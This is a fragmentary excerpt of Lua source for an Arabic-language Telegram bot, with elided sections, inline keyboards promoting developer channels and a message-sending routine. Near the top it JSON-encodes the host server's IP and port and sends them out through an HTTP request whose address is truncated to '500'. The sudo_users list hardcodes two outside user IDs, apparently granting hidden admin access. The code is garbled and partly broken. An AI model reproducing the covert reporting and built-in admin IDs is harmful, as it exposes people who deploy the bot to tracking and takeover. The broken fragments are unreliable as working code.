...
infotnseb.port = Port
infotnseb.ip = IP
https.request('500'..JSON.encode(infotnseb))
create_config_auto()
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
...
--------------------------------------------------------------------------------------------------------------
print([[
        __  _______  __ _____   __  __________ 
  /  |/  / __ \/ // / _ | /  |/  / __/ _ \
 / /|_/ / /_/ / _  / __ |/ /|_/ / _// // /
/_/  /_/\____/_//_/_/ |_/_/  /_/___/____/ 
...
sudo_users = {SUDO,859213488,1398830949,}  
...
local Text = [[
[مبرمج سورس الصياد وبوت مون](t.me/mo1ibrahim)
]]
keyboard = {} 
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = ' ༄𝐷e𝑣 𝙰𝙷𝙼𝙴𝙳 ',url="t.me/Dev_Ah8"}},}
...
{{text = '  ◍『 ✰ لشراء بوت ✰ 』𖣌 ', url="t.me/SO_ALSIYAD"}},
...
{{text = '  𖣘 ⁽Dav 𝙰𝙷𝙼𝙴𝙳₎ 𖣘 ',url="t.me/Dev_Ah8"}},
...
tdcli_function ({ID = "GetUser",user_id_ = SUDO},function(arg,result) 
 ...
 local msg_id = msg.id_/2097152/0.5
local Text = [[
 مطور البوت لو حابب تتواصل معاه يقمر ◐
]]
keyboard = {} 
...
if text == "مغني" and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
...
{
{text = ' 𝚂𝙾 𝙰𝙻𝚂𝙸𝚈𝙰𝙳', url="t.me/SO_ALSIYAD"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
